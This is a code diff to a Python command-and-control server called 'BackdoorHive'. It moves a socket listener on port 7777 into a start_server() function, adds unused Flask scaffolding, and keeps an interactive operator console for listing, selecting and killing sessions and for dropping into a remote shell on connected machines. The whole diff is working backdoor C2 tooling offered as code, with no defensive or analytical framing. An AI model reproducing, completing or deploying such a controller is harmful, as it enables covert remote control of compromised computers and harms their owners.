@@ -6,6 +6,15 @@ import os
 import base64
 import threading
 
+import flask
+from flask import *
+
+app = Flask(__name__)
+
+ips = [] #list of IP,port
+targets = [] #lisk of socket objects
+stop_threads = False
+client_index = 0
 
 def shell(target, ip):
     def send_j(data):
@@ -97,62 +106,65 @@ def server():
 
 
 
- #count of connections
-global s
-ips = [] #list of IP,port
-targets = [] #lisk of socket objects
-s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
-s.bind(("0.0.0.0", 7777))
-s.listen(5)
-print("Listening to incoming connections")
-client_index = 0
+def start_server():
+     #count of connections
+    global s
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+    s.bind(("0.0.0.0", 7777))
+    s.listen(5)
+    print("Listening to incoming connections")
+    thread1 = threading.Thread(target=server) #setting a thread to run function server()
+    thread1.start()
+    # C2 center
+    while True:
+        cmd = input("BackdoorHive > ")
+        cmd_l = cmd.split()
+        if not cmd_l: #to pass next iteration when pressing enter and no input given
+            continue
+        #exit C2 center
+        elif cmd_l[0].lower() == "exit":
+            stop_threads = True #stop thread1
+            break # exit current while loop
+        elif cmd_l[0].lower() == "help":
+            help_opt = '''
+        sessions        : Display active sessions 
+        session <id>    : Interact with specific session
+        background      : background the active session
+        exit            : Exit C2 server 
+                                '''
+            print(help_opt)
+        elif cmd_l[0].lower() == "sessions":
+            count = 0
+            for ip in ips:
+                print(f"Session {count} ----- {ip}")
+                count += 1
+        #kill session <id>
+        elif cmd_l[0].lower() == "kill":
+            try:
+                session_id = int(cmd_l[1])
+                targets[session_id].close()
+                targets.pop(session_id) #only remove session from list (connection still alive problem)
+                ips.pop(session_id)
+                #need to implement how to terminate session
+            except:
+                print ("No session to close")
+        #interact with a specific target
+        elif cmd_l[0].lower() == "session":
+            try:
+                session_id = int(cmd_l[1])
+                target = targets[session_id]
+                ip = ips[session_id]
 
-stop_threads = False
-thread1 = threading.Thread(target=server) #setting a thread to run function server()
-thread1.start()
+            except:
+                print("Session not found")
+            else:
+                shell(target, ip)
 
-# C2 center
-while True:
-    cmd = input("BackdoorHive > ")
-    cmd_l = cmd.split()
-    if not cmd_l: #to pass next iteration when pressing enter and no input given
-        continue
-    #exit C2 center
-    elif cmd_l[0].lower() == "exit":
-        stop_threads = True #stop thread1
-        break # exit current while loop
-    elif cmd_l[0].lower() == "help":
-        help_opt = '''
-    sessions        : Display active sessions 
-    session <id>    : Interact with specific session
-    background      : background the active session
-    exit            : Exit C2 server 
-                            '''
-        print(help_opt)
-    elif cmd_l[0].lower() == "sessions":
-        count = 0
-        for ip in ips:
-            print(f"Session {count} ----- {ip}")
-            count += 1
-    #kill session <id>
-    elif cmd_l[0].lower() == "kill":
-        try:
-            session_id = int(cmd_l[1])
-            targets[session_id].close()
-            targets.pop(session_id) #only remove session from list (connection still alive problem)
-            ips.pop(session_id)
-            #need to implement how to terminate session
-        except:
-            print ("No session to close")
-    #interact with a specific target
-    elif cmd_l[0].lower() == "session":
-        try:
-            session_id = int(cmd_l[1])
-            target = targets[session_id]
-            ip = ips[session_id]
-
-        except:
-            print("Session not found")
-        else:
-            shell(target, ip)
+'''@app.route("/")
+def index():
+    return render_template("index.html")
+'''
+if __name__ == '__main__':
+    start_server()
+    #app.run(debug=True)
